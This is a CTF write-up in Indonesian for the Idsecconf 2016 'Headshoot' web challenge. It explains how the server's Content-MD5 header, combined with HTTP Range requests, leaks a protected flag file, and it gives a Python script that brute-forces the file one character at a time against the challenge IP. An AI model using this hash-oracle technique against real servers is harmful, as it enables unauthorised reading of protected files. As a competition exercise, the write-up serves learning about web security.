---
layout: post
title: "Idsecconf CTF 2016 : Headshoot - 200"
description: "Idsecconf CTF 2016 Online"
headline: 
modified: 2016-08-29
date: 2016-08-29
category: CTF
tags: [idsecconf,Web Exploitation]
imagefeature: /images/idsecconf.jpg
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

`http://139.59.245.67:8000/`

### Solusi :

Di berikan sebuah website dan lokasi flag di beritahu ada di `http://139.59.245.67:8000/flag.txt`
namun kita hanya bisa menggunakan Method `OPTIONS,HEAD` 

menurut w3 protocol : `The HEAD method is identical to GET except that the server MUST NOT return a message-body in the response. `

`Content-MD5, A Base64-encoded binary MD5 sum of the content of the request body, Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== Obsolete`

`echo 'T/JeCTIbbkLdlRS/YqTvHw==' | base64 -d | xxd`

![Headshoot MD5](/images/headshoot_md5.png)

ditemukan md5 `4ff25e09321b6e42dd9514bf62a4ef1f` tidak bisa di decrypt secara online. dan setelah
surving di wikipedia ternyata kita bisa menambahkan header Range: bytes 0-1. dan akan bisa mengatur Response header
dengan menambahkan range kita bisa melakukan bruteforce terhadap MD5 nya perkarakter.

```python
import requests
import hashlib
import string
import binascii


url = 'http://139.59.245.67:8000/flag.txt'

flag = ''


while True:
    headers = {'Range': 'bytes=0-'+str(len(flag)+1)}
    r = requests.head(url, headers=headers)
    md5 = r.headers.get('Content-MD5')
    md5 = binascii.a2b_base64(md5)
    md5 = binascii.hexlify(md5)
    print md5
    for c in string.printable:
        newflag = flag+c
        newmd5 = hashlib.md5(newflag).hexdigest()
        if newmd5==md5:
            flag+=c
            print flag
            break    

```

dan di dapatkan flag : `flag{HaveYouEverSeenMD5ContentHeaderBeforeThis?}`